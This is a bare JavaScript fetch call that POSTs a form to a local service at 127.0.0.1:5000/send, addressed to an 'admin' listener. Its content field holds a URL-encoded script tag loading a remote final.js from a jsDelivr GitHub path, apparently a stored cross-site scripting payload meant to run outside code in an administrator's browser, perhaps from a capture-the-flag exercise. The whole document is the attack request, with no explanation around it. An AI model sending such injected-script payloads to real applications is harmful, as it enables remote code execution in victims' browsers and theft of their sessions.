fetch("http://127.0.0.1:5000/send", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
  },
  "body": "header=324&listener=admin&content=%3Cscript+src%3D%22https%3A%2F%2Fcdn.jsdelivr.net%2Fgh%2Fpaprays%2Fpayprays.github.io%40main%2Ffinal.js%22%3E%3C%2Fscript%3E",
  "method": "POST",
});
